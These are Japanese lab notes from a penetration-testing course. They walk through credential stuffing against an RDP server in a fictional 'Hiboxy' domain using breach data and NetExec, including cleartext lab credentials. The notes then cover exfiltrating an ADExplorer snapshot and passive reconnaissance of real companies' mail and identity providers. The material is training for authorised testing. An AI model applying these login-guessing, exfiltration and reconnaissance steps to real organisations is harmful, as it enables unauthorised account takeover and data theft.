# Lab day1

## Lab 1.1 - Credential Stuffing to a Breach

このラボでは、hiboxy.com Active Directory ドメイン内に公開された RDP サーバーを見つけ、過去の侵害から @hiboxy.com アカウントの認証情報を発見し、それらの認証情報を再利用して RDP サーバーに対して有効なログインを見つけ、ログインしてデータを流出させます。

このラボは、侵害が効果的であるために複雑である必要はなく、また「実際の」エクスプロイトが関与する必要もないことを示しています。
バグは修正されますが、機能は永遠に続くのです。
バグは修正されるが、機能は永遠に続く。

### 1: Finding 1FA Services

Hiboxyの外部ネットワーク上の存在を確認する過程で、Shodanを使用して既に公開されたRDPサーバーを発見しています：

![[スクリーンショット 2026-03-02 14.40.57.png]]

Hiboxyは、このペネトレーションテストのためにOpenVPN経由で内部ネットワークへのアクセスを提供しています。同社のRDPサーバーであるRDP01は、ファイアウォール経由のNATを使用して外部からアクセス可能であることが確認されていますが、内部IPアドレスは10.130.10.23です。

まず、RDPサーバーが内部ネットワークからアクセス可能か確認します。Windows 11 VMのデスクトップにあるターミナルリンクから新しいPowerShellウィンドウを起動し、以下のコマンドを実行してください：

```powershell
PS C:\Users\sec560> nmap 10.130.10.23 -p 3389 --script rdp-ntlm-info --unprivileged -Pn
```

内部で同じRDPサーバーが利用可能であることを確認しました。Active Directoryドメイン名(hiboxy.com)も確認済みです。

VPN経由でスキャンするため、Nmapに--unprivileged引数が必要です。10.130.10.23はポート80に返信しないため -Pn引数 でホスト検出フェーズをスキップします。

```powershell
PS C:\Users\sec560> nmap 10.130.10.23 -p 3389 --script rdp-ntlm-info --unprivileged -Pn

Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-13 14:09 Pacific Daylight Time

Nmap scan report for ip-10-130-10-23.us-east-2.compute.internal (10.130.10.23)

Host is up (0.079s latency).

PORT STATE SERVICE

3389/tcp open ms-wbt-server

| rdp-ntlm-info:

| Target_Name: HIBOXY

| NetBIOS_Domain_Name: HIBOXY

| NetBIOS_Computer_Name: RDP01

| DNS_Domain_Name: hiboxy.com

| DNS_Computer_Name: rdp01.hiboxy.com

| DNS_Tree_Name: hiboxy.com

| Product_Version: 10.0.20348

|_ System_Time: 2024-08-13T21:10:00+00:00

Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds
```

#### Tip

Microsoft Exchangeは内部のActive Directoryドメイン名も公開しており、Exchangeは一般的に外部に公開されています。

この環境内のドメイン名を知りたい場合は、次のコマンドを使用できます：
```powershell
nmap 10.130.10.25 -Pn -n -p 25 --script smtp-ntlm-info --unprivileged
```

### 2: Searching through Breach Data

Active Directoryのドメイン名が判明したので、そのドメインを持つアカウントを侵害データから検索できます。

Windows 11 VM内の`C:\CourseFiles\breachdata.txt`というファイルには、過去に発生した既知の侵害事件から取得したユーザー名とパスワードが格納されています。このデータを使用してRDPサーバーへのログインを試みます。

まず元の`breachdata.txt`ファイルの最初の3行を確認し、データの形式（メールアドレス:パスワード）を把握します。

次に`@hiboxy.com`:を含む行を検索し、それらを`hiboxy_breachdata.txt`という新規ファイルに保存します。このファイルからユーザー名とパスワードを抽出します。

```powershell
cd C:\CourseFiles

Get-Content breachdata.txt | Select-Object -First 3

# Get lines containing "@hiboxy.com:" using Select-String, without line numbers, and put them in hiboxy_breachdata.txt

Select-String "@hiboxy.com:" C:\CourseFiles\breachdata.txt | Select-Object -ExpandProperty Line | Out-File -encoding ascii hiboxy_breachdata.txt
```

```powershell
PS C:\WINDOWS\system32> cd C:\CourseFiles

PS C:\CourseFiles> Get-Content breachdata.txt | Select-Object -First 3

linda.miller@fabrikam.com:abc123
david.brown@northwindtraders.com:12345
john.smith@adatum.com:password123

PS C:\CourseFiles> # Get lines containing "@hiboxy.com:" using Select-String, without line numbers, and put them in hiboxy_breachdata.txt

PS C:\CourseFiles> Select-String "@hiboxy.com:" C:\CourseFiles\breachdata.txt | Select-Object -ExpandProperty Line | Out-File -encoding ascii hiboxy_breachdata.txt
```

`hiboxy_breachdata.txt`ファイルからユーザー名とパスワードを抽出します。まず、ユーザー名（@記号の左側にあるすべての文字列）を抽出して、`hiboxy_users.txt`という新しいファイルに保存します。次に、パスワード（最初の:記号の右側にあるすべての文字列。パスワードに:が含まれる場合も同様）を抽出して、`hiboxy_passwords.txt`という新しいファイルに保存します。

```powershell
Get-Content C:\CourseFiles\hiboxy_breachdata.txt | ForEach-Object { $_.Split('@')[0] } | Out-File -encoding ascii C:\CourseFiles\hiboxy_users.txt
Get-Content C:\CourseFiles\hiboxy_breachdata.txt | ForEach-Object { $_.Split(':',2)[1] } | Out-File -encoding ascii C:\CourseFiles\hiboxy_passwords.txt
```

hiboxy_users.txtファイルの最初の行は、hiboxy_passwords.txtファイルの最初の行に対応します。一部のツール（後ほど授業で使用するTHC-Hydraなど）では、ユーザー名:パスワード形式の認証情報を1つのファイルで使用できますが、他のツールでは使用できません。

### 3: SMB Credential Stuffing

次に紹介するツールはNetExecです。これは大規模環境のセキュリティテストを自動化するペネトレーションテストツールです。NetExecを使用して、侵害データから発見した認証情報でRDPサーバーへのログインを試みます。ラボの効率化のため、ターゲットサービスとしてSMBを使用します。RDPも選択肢として利用可能ですが、出力速度が遅く、状況によっては信頼性が低下する場合があります。

```powershell
nxc smb -u "C:\CourseFiles\hiboxy_users.txt" -p "C:\CourseFiles\hiboxy_passwords.txt" -d hiboxy.com --continue-on-success --no-bruteforce 10.130.10.23
```

```
PS C:\CourseFiles> nxc smb -u "C:\CourseFiles\hiboxy_users.txt" -p "C:\CourseFiles\hiboxy_passwords.txt" -d hiboxy.com --continue-on-success --no-bruteforce 10.130.10.23
SMB         10.130.10.23    445    RDP01            [*] Windows Server 2022 Build 20348 x64 (name:RDP01) (domain:hiboxy.com) (signing:False) (SMBv1:False)
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\jsmith:Summer2020! STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\dmiller:nuggetnugget STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\amartin:AstonMartinDB5 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\jwood:Rockin10 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [+] hiboxy.com\hmoore:Shane1**
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\mjohnson:Chocolate1! STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\agardner:Vocabulary STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\emartinez:Explorer007 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\mlee:Musketeer_4th STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\tanderson:MatrixRev9 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\wwilliams:Williams@2020 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\jmartinez:Julio@2003 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\khill:OverTheHill45 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\swilson:SeahawksFan52 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\dbrown:BostonCeltics#1 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\cdavis:ClaraD!2020 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\hthomas:TommyBoy2022 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [+] hiboxy.com\sbishop:Ethnogeographically1
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\rduran:Winter2018! STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\rrodriguez:Rodriguez24@ STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\syoung:Youngster52 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\mgarcia:MariaG2020* STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\awright:WrightFlight1903 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [+] hiboxy.com\apena:F1r3Dr@g0n
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\bhall:BeachBum$29 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\ljones:LiverpoolFC! STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\nlopez:Spring2019 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\jclark:ClarkKent2019 STATUS_LOGON_FAILURE
SMB         10.130.10.23    445    RDP01            [-] hiboxy.com\eharris:EddieMoney2020 STATUS_LOGON_FAILURE
```

コンテキストとして、使用されたコマンドラインオプションは以下の通りです：

smb — SMBプロトコルを使用

`-u "C:\CourseFiles\hiboxy_users.tx"` — hiboxy_users.txtファイル内のユーザー名を使用

`-p "C:\CourseFiles\hiboxy_passwords.txt"` — hiboxy_passwords.txtファイル内のパスワードを使用

`-d hiboxy.com` — ドメイン hiboxy.com を使用（ローカル認証情報ではなく）

`--continue-on-success` — 認証が成功した場合でも他の認証情報の試行を継続

-`-no-bruteforce` — ファイル内のペアになったユーザー名とパスワードを使用。バリエーション（最初のユーザー名と最初のパスワード、2番目のユーザー名と2番目のパスワードなど）を試行しない

侵害されたパスワードのバリエーションを試したり、「統計的に可能性の高いユーザー名」などのソースから他のユーザー名を試すことも可能ですが、現時点で有効な認証情報があるため、それらを使用してログインを進めましょう。

### 4: Finding, Gathering, and Exfiltrating Sensitive Data

見つけた認証情報を使ってログインしましょう。3つのアカウントのいずれかを選択してログインし、Windowsに組み込まれているRDPクライアントを起動してください。

```powershell
# Pick randomly from the three working accounts
PS C:\CourseFiles> "hmoore","sbishop","apena" | Get-Random
hmoore
PS C:\CourseFiles> mstsc
```

最後のコマンド（mstsc）はリモート デスクトップ 接続アプリケーションを起動します。画面は次のようになります：

![[スクリーンショット 2026-03-02 15.02.22.png]]

宛先コンピューターに「10.130.10.23」を入力し、「オプションの表示」をクリックします。上記でランダムに選択したユーザー名（ドメインを含む、例：hiboxy\hmoore）を入力します。「ローカルリソース」タブで「詳細...」をクリックし、下図のように「ドライブ」がチェックされていることを確認します：

![[スクリーンショット 2026-03-02 15.03.33 1.png]]

正常に動作した3つのアカウントは以下の通りです：

```
hiboxy.com\hmoore:Shane1**
hiboxy.com\sbishop:Ethnogeographically1
hiboxy.com\apena:F1r3Dr@g0n
```


任意のコードを実行できる認証済み内部セッションは、攻撃者にとって強力な立場です。まずは環境情報の収集から始めましょう。Active Directory Explorer（ADExplorer）を使用してHiboxyのActive Directory環境を調査します。また、HiboxyのAD環境のスナップショットを取得して自身のマシンで分析できるほか、その他の機密データを発見・漏洩させることも可能です。

次に、表示されるファイルエクスプローラーのウィンドウで「このPC」をクリックします。「リダイレクトされたドライブとフォルダー」の下にある「SEC560-WINDOWS:」の「C」をダブルクリックします。

![[スクリーンショット 2026-03-02 15.07.06.png]]

次に、binディレクトリに移動し、ADExplorerをダブルクリックします：

![[スクリーンショット 2026-03-02 15.03.33.png]]

プロンプトが表示されたら、[同意する]をクリックしてライセンス契約に同意します。ADExplorerが開いたら、接続情報を空白のままにし（現在のActive Directoryドメインがデフォルトで設定されます）、[OK]をクリックします：

![[スクリーンショット 2026-03-02 15.08.54.png]]

HiboxyのActive Directory環境が表示されます。これはActive Directoryの「ユーザーとコンピューター」に類似しています。必要に応じて、ウィンドウ左側のツリーを操作して環境を探索できます。

ウィンドウ左上の「ファイル」をクリックし、「スナップショットの作成」を選択します。省略記号 (...) をクリックしてスナップショットの保存先を選択し、左側のクイックアクセスメニューにある「デスクトップショートカット」をクリックします。「ファイル名:」フィールドに「Hiboxy-snapshot」と入力し、「保存」をクリックした後、「OK」をクリックします:

![[スクリーンショット 2026-03-02 15.09.40.png]]

ADExplorerを閉じることができます。次に、スナップショットを外部に持ち出します。デスクトップ上の「Hiboxy-snapshot」ファイルを右クリックし、「切り取り」を選択します。その後、開いたままのファイルエクスプローラーウィンドウ内で右クリックし、「貼り付け」をクリックします。これにより、スナップショットがWindows 11 VMのC:\binディレクトリに移動されます。

**Information**
> ADExplorerはC:\binディレクトリに直接保存できますが、RDPのファイル遅延により時間がかかります。

画面上部中央にある×をクリックして、リモートデスクトップ接続を終了してください：

### 5: Analyzing Exfiltrated ADExplorer Data

HiboxyがRDP接続とスナップショットの外部流出に気づいたとしても、流出データのコピーを削除することはできません。また、データ収集にはMicrosoft署名付きバイナリ（ADExplorer）を使用しているため、あらゆるAVやEDRソリューションがこの活動を無視する可能性が高いです。

次に、Windows 11 VM上でADExplorerを開いてください。ADExplorerの実行ファイルはC:\binディレクトリにあります。起動し（EULAの提示があれば同意）、[Enter the path of a previous snapshot to load]ラジオボタンを選択してください。Path:テキストボックス右端の省略記号ボタン(...)をクリックし、C:\binディレクトリに移動してHiboxy-snapshotファイルを選択後、[Save]をクリックします。

![[スクリーンショット 2026-03-02 15.14.25.png]]

[OK] をクリックしてスナップショットを読み込みます。RDP サーバーで表示されたのと同じ Hiboxy Active Directory 環境のビューが表示されるはずです。

ADExplorer ウィンドウの左側にある DC=hiboxy,DC=com アイコンをクリックします。右側のウィンドウペインには、ドメインオブジェクト自体の LDAP 属性名と値が表示されます。

まず、ms-DS-MachineAccountQuotaを確認してください。値が10に設定されているのがわかりますか？これは危険なデフォルト設定です。つまり、ドメイン内のユーザーは誰でも最大10個のコンピューターアカウントを作成できることを意味します。本質的に危険ではありませんが、他の脆弱性と組み合わさると危険な攻撃を可能にするため、ペネトレーションテストでの発見事項となるべきです。代わりに、コンピューターアカウントの作成には専用アカウントを使用し、ms-DS-MachineAccountQuotaの値は0に設定すべきです。

次に、minPwdLength（7）を確認してください。lockoutThresholdが0（ロックアウトなし）と組み合わさると、パスワード推測攻撃が罰則なしで実行可能になります。pwdProperties属性は1に設定されており、パスワードは「複雑」である必要があります。これらの設定が組み合わさることで、非常に脆弱なパスワードポリシーとなり、攻撃者はサーバーが許容する限り、何の罰則や本番環境への影響もなくパスワードを高速に推測できます。

ここでADExplorerを閉じましょう。今後のラボでHiboxyの詳細な検証は行いますが、既にいくつかの高リスクな発見を確認できました。

### 結論

このラボでは、Hiboxyドメイン内に公開されたRDPサーバーを発見し、ドメインの侵害された認証情報を特定しました。それらの認証情報を使用してRDPサーバーにログインし、機密データを流出させました。ドメインには脆弱なパスワードポリシーと、コンピューターアカウント作成時の危険なデフォルト設定が存在することが判明しました。

重要な点として、侵害が効果的であるために複雑である必要はなく、修正可能な脆弱性が関与する必要もないことも確認しました。

**さらに調査を進めたいですか？以下のアイデアをご参考ください：**

- ドメイン内の全ユーザー権威リストをダンプ（ImpacketのGetADUsers.pyスクリプト使用）→ 共通パスワードをスプレッド
- 共通パスワード（https://weakpasswords.net/）と既知の漏洩パスワードをスプレッド
- 既知の侵害済み認証情報のバリエーションを試す（ハッシュキャットのルール best66.rule を使用するか、独自の知恵を働かせる。例：過去に侵害された Winter2018! というパスワードを Summer2024! に更新する）

### Bonus
2名のユーザーがC:\CourseFiles\breachdata.txtファイルに記載されているパスワードパターンと一致しています：
- ネイサン・ロペス（人事）、nlopez@hiboxy.comは、侵害データにSpring2019として記録されています。ただし侵害データは本質的に古い情報であるため、現在および次のシーズンのパターンを試してください！
- Rachel Duran (マーケティング)、rduran@hiboxy.com は、侵害データに Winter2018! として記録されています。現在のシーズンと次のシーズンで同じパターン（! 付き）を試してみてください！

C:\CourseFiles\breachdata.txtファイルに記載されている2名のユーザーは、パスワードにわずかなバリエーションがあります：

- Andrea Gardner, agardner@hiboxy.com, は侵害データにVocabularyとして記録されています。パスワードの末尾に数字や特殊文字を追加してみてください。
- Jonathan Wood, jwood@hiboxy.com, は侵害データにRockin10として記録されています。パスワードの末尾に数字や特殊文字を追加してみてください。

## Lab 1.2: Reconnaissance and OSINT

Hiboxyへの攻撃を開始する前に、同社のインフラストラクチャと潜在的な攻撃対象領域に関する包括的な情報を収集する必要があります。公開情報のみを活用し、同社へのメールフローの調査、公開IPアドレス範囲の特定、利用しているサードパーティサービスの発見、証明書透明性ログを通じたウェブプレゼンスのマッピングを行います。

調査により、NTLM認証が有効化されたExchangeサーバーを含む、露出している認証エンドポイントが明らかになります。

これは重大な発見です。なぜなら、他の場所でMFAが有効化されていても、これらのエンドポイントは攻撃可能だからです。DNS偵察を通じて、Hiboxyが利用する様々なクラウドサービスやSaaSプラットフォームも発見され、ソーシャルエンジニアリングやパスワードスプレー攻撃に有用な情報を提供します。この受動的な偵察フェーズにより、積極的な攻撃を開始する前に、標的環境を徹底的に理解することが保証されます。

このラボでは、標的組織を特定し、後の攻撃に有用な攻撃対象領域を見つけるために用いられる偵察手法の一部を実演します。いくつかの組織例を検討し、最後にボーナスとして、ランダムに選ばれたS&P 500企業に対してこれらの手法を自ら試す機会を提供します。

注意：いかなる標的への攻撃も許可されていません。公開されている情報のみを扱います。

### 1: How Email Flows to a Company

メールを受信するには、企業はDNSにMXレコードを公開する必要があります。これらのレコードは、ドメイン宛てのメールを受け付けるメールサーバーを指し示します。PowerShellを使用して、いくつかの企業のMXレコードを調べます。
デスクトップの「ターミナル」リンクをクリックしてPowerShellターミナルを開き、以下を実行します：

```powershell
Resolve-DnsName -Type MX -Name lowes.com
```

```powershell
PowerShell 7.5.2
PS C:\Users\sec560> Resolve-DnsName -Type MX -Name lowes.com

Name                                     Type   TTL   Section    NameExchange                              Preference
----                                     ----   ---   -------    ------------                              ----------
lowes.com                                MX     1449  Answer     lowes-com.mail.protection.outlook.com     10

Name       : lowes-com.mail.protection.outlook.com
QueryType  : A
TTL        : 9
Section    : Additional
IP4Address : 52.101.11.2


Name       : lowes-com.mail.protection.outlook.com
QueryType  : A
TTL        : 9
Section    : Additional
IP4Address : 52.101.194.3


Name       : lowes-com.mail.protection.outlook.com
QueryType  : A
TTL        : 9
Section    : Additional
IP4Address : 52.101.11.3


Name       : lowes-com.mail.protection.outlook.com
QueryType  : A
TTL        : 9
Section    : Additional
IP4Address : 52.101.10.12


PS C:\Users\sec560>
```

PowerShell ウィンドウのサイズによって、表示される列は異なる場合があります。ここでは、@lowes.com アドレス宛てのメールが Microsoft 365(mail.protection.outlook.com) に送信されていることがわかります。つまり、メールは送信元のメールサーバーから直接 Microsoft へ流れているのです。
他にどのような選択肢があるでしょうか？一部の企業では、ProofPointやMimecastなどのサードパーティ製メールセキュリティサービスを利用し、メールが自社のメールサーバーに到達する前にフィルタリングしています。ProofPointを利用している企業の一例としてSANSを見てみましょう。

```powershell
Resolve-DnsName -Type MX -Name sans.org
```

```powershell
PS C:\Users\sec560> Resolve-DnsName -Type MX -Name sans.org

Name                                     Type   TTL   Section    NameExchange                              Preference
----                                     ----   ---   -------    ------------                              ----------
sans.org                                 MX     9     Answer     mxa-002c1802.gslb.pphosted.com            10
sans.org                                 MX     9     Answer     mxb-002c1802.gslb.pphosted.com            10

Name       : mxa-002c1802.gslb.pphosted.com
QueryType  : A
TTL        : 29
Section    : Additional
IP4Address : 205.220.161.71


Name       : mxb-002c1802.gslb.pphosted.com
QueryType  : A
TTL        : 29
Section    : Additional
IP4Address : 205.220.161.71


PS C:\Users\sec560>
```

**Resolve-DnsName の Linux 版について知りたいですか？**

>Linux では DNS レコードの検索に dig コマンドが使用できます。同等のコマンドは以下の通りです：

```bash
dig sans.org MX +short
```

ここでは、@sans.org アドレス宛てのメールがまず ProofPoint のメールフィルタリングサービスに送信されることがわかります。フィルタリング後、ProofPoint はメールを SANS の実際のメールサーバーに転送します。実際のメールサーバーの場所をどうやって知るのでしょうか？場合によってはこれが難しいこともありますが、GetUserRealmエンドポイントを使用すれば、企業がMicrosoft 365を具体的に使用しているかどうかを簡単に確認できます。このエンドポイントは、Microsoftアプリケーションが特定のドメインのユーザー認証方法を決定するために使用されます。これにより、ドメインがMicrosoftを直接使用しているか、Okta、PingIdentity、SecureAuth、RSA SecurID Access、またはADFSなどのサードパーティのIDプロバイダーを使用しているかがわかります。

GetUserRealmエンドポイントのURLは以下です：
https://login.microsoftonline.com/GetUserRealm.srf

クエリパラメータとしてログイン情報（検索対象のメールアドレス）を指定します。
対象ドメイン内の任意のメールアドレス（実在するか否かは問わない）を使用可能です。

sans.orgドメインを例に確認してみましょう：

```powershell
Invoke-WebRequest -Uri "https://login.microsoftonline.com/GetUserRealm.srf?login=invalid@sans.org" | Select-Object -ExpandProperty Content | ConvertFrom-Json
```

```powershell
PS C:\Users\sec560> Invoke-WebRequest -Uri "https://login.microsoftonline.com/GetUserRealm.srf?login=invalid@sans.org" | Select-Object -ExpandProperty Content | ConvertFrom-Json

State                  : 4
UserState              : 1
Login                  : invalid@sans.org
NameSpaceType          : Managed
DomainName             : sans.org
FederationBrandName    : Escal Institute of Advanced Technologies DBA SANS Institute
CloudInstanceName      : microsoftonline.com
CloudInstanceIssuerUri : urn:federation:MicrosoftOnline

PS C:\Users\sec560>
```

この場合、@sans.org アドレス宛のメールはまず ProofPoint に送信され、その後Microsoft 365 に転送されることが明確です。
また、NameSpaceType が Managed であることから、SANS が ID 管理に Microsoft を直接利用していることも確認できます。

NameSpaceTypeにはどのような選択肢がありますか？
- Managed : ドメインがMicrosoftを直接利用してID管理を行う。
- Federated: ドメインがサードパーティのIDプロバイダーを利用してID管理を行う。IDプロバイダーのAuthURLフィールドにURLが示される。
- Unknown : ドメインがMicrosoft 365を利用していない。

**フェデレーテッド認証の例を見てみませんか？**
> 以下はサードパーティのIDプロバイダーを利用する企業の例です。AuthURLフィールドはIDプロバイダーのURLを示しています。これらのURLをウェブブラウザで訪問すると、IDプロバイダーのログインページを確認できます（当然ながら、URLは変更される可能性があります）。
> 
> 上記の例と同様に、GetUserRealm URL（例：`https://login.microsoftonline.com/GetUserRealm.srf?login=invalid@packagingcorp.com` ※ドメインは必要に応じて置換）を使用して、いずれの企業についても最新の結果を照会できます。
> 
> - SecureAuth (packagingcorp.com): `https://idp.packagingcorp.com/SecureAuth23/?username=invalid%40packagingcorp.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=`
> - Okta (wm.com): `https://wmlogin.wm.com/app/oﬃce365/exk37yw079IDNyIam4x7/sso/wsfed/passive?username=invalid%40wm.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=`
> - RSA SecurID Access (hosthotels.com):` https://guestservices.rap.hosthotels.com/IdPServlet?idp_id=14knwft3srifx`
> - ADFS (lowes.com): `https://sts.lowes.com/adfs/ls/?username=invalid%40lowes.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=`
> - Okta (match.com): `https://match.okta.com/app/oﬃce365/exkeoydqsycke55hh356/sso/wsfed/passive?username=invalid%40match.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=`
> - PingIdentity (abbvie.com): `https://federation.abbvie.com/idp/prp.wsf?username=invalid%40abbvie.com&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=`

**Active Directoryに関するヒント: フェデレーションサービス (ADFS)**
> URLに /adfs/ls/ が含まれている場合、その企業はADFSをIDプロバイダーとして使用しています。ADFSはActive Directoryと連携するオンプレミス型IDプロバイダーです。必ず該当ページにアクセスし、変更点がないか注意深く確認してください。企業はパスワードリセットリンク、サポート連絡先、その他の有用な情報を提供していることがよくあります。

企業がMicrosoft 365を使用していない場合、ドメインのSPFレコードを調べることで実際のメールサーバーを特定できることが多い。SPFレコードとは、そのドメインのメール送信を許可されたサーバーを示すDNSのTXTレコードである。

**例としてfastenal.comのSPFレコードを調べてみよう：**

```powershell
Resolve-DnsName -Type TXT -Name fastenal.com | Where-Object { $_.Strings -like "v=spf1*" }
```

```powershell
PS C:\Users\sec560> Resolve-DnsName -Type TXT -Name fastenal.com | Where-Object { $_.Strings -like "v=spf1*" }

Name                                     Type   TTL   Section    Strings
----                                     ----   ---   -------    -------
fastenal.com                             TXT    299   Answer     {v=spf1
                                                                 include:spf.protection.outlook.com
                                                                 include:spf.mandrillapp.com
                                                                 include:spf.criticalimpactinc.com
                                                                 include:wappmail.com
                                                                 a:b.spf.service-now.com
                                                                 ip4:148.163.142.133 ip4:148.163.146.161
                                                                 , ip4:192.254.121.248 ip4:23.21.109.197
                                                                 ip4:23.21.109.212 ip4:68.73.223.13
                                                                 ip4:205.243.112.9 ip4:205.243.112.22
                                                                 ip4:205.243.112.227 ip4:216.34.99.11
                                                                 ip4:216.34.99.12 ip4:167.89.45.155
                                                                 ip4:168.245.103.157 ip4:208.117.50.210 ,
                                                                 ip4:146.20.91.152 ip4:146.20.91.153
                                                                 ip4:168.245.16.242 ip4:38.117.70.165
                                                                 -all}

PS C:\Users\sec560>
```

SPFレコードの完全な解析はやや複雑ですが、fastenal.comがメール送信に複数のサードパーティサービスを利用していることが確認できます。具体的には：

- `spf.protection.outlook.com`: Microsoft 365（Microsoft 365利用の信頼性が高い指標）
- `spf.mandrillapp.com`: Mandrill (メールマーケティングサービス)
- `spf.criticalimpactinc.com`: Critical Impact (メールマーケティングサービス)
- `wappmail.com`: 自動化プラットフォームform.comに関連
- `a:b.spf.service-now.com`: ServiceNow (ITサービス管理プラットフォーム)
- `ip4:...`: ドメインのメール送信を許可された各種IPアドレス。自社所有またはサードパーティサービス所有の可能性があります。

本質的に、特定の企業のメールサーバーが分かれば、通常は認証プロバイダーも特定できます。例えば、企業がメールにMicrosoft 365を使用している場合、ID管理にもMicrosoft Entra IDを使用しているはずです。

後ほど、このプロセスを自動化するAADInternals PowerShellモジュールのInvoke-AADIntReconAsOutsiderコマンドレットについて説明します。このコマンドレットはMXレコードの検索、GetUserRealmエンドポイントの確認、および対象ドメインで使用されているIDプロバイダーを特定するための追加チェックを実行します。先取りしたい場合は、PowerShellでImport-Module AADInternalsを実行してモジュールをインポートし、`Invoke-AADIntReconAsOutsider -DomainName sans.org`（sans.orgをターゲットドメインに置き換えて）を実行すると結果を確認できます。

### 2: Finding Public IP Space Owned by a Company

ルーターがBGPを介して相互にトラフィックを送信する仕組みを利用することで、特定の企業が所有するパブリックIPアドレス空間を調査できます。これにより、将来の攻撃対象候補を特定することが可能です。企業は1つ以上の自律システム番号（ASN）を保有しており、これは単一の組織が管理するIPネットワーク群を識別するために使用されます。特定の企業が所有するASNを調査し、それらのASNに関連付けられたIPアドレス範囲を特定できます。

ASNとIP範囲の検索にはHurricane Electric BGP Toolkitを使用します。Home Depotが所有するASNを検索してみましょう：

